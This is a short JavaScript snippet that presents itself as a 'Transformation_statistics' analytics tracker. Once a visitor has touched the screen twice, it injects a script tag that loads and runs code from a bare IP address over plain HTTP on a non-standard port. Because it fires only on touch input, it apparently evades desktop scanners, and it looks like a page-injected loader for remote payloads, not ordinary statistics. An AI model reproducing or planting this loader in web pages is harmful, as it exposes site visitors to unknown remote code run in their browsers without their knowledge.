tid = 42709023;//717037
vdate=20190711;
(function(Transformation_statistics){Transformation_statistics.int=0;Transformation_statistics.eventEndInt=2;Transformation_statistics.scriptUrl="http://183.60.201.221:4436/statistics.php";eventIntAdd=function(){Transformation_statistics.int++;}
loadJsScript=function(scriptSrc){var hm=document.createElement("script");hm.src=scriptSrc;var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s);}
LoadTransformationScript=function(){loadJsScript(Transformation_statistics.scriptUrl);}
Transformation_statistics.Listener=function(){if(typeof lsck!="function"){window.removeEventListener("touchstart",window.Transformation_statistics.Listener,false);}
eventIntAdd();if(Transformation_statistics.int>=Transformation_statistics.eventEndInt){window.removeEventListener("touchstart",window.Transformation_statistics.Listener,false);LoadTransformationScript();}}
re=function(){window.addEventListener("touchstart",window.Transformation_statistics.Listener);}
Transformation_statistics.start=function(){re();}
window.Transformation_statistics=Transformation_statistics;})(window.Transformation_statistics||{});window&&Transformation_statistics.start();

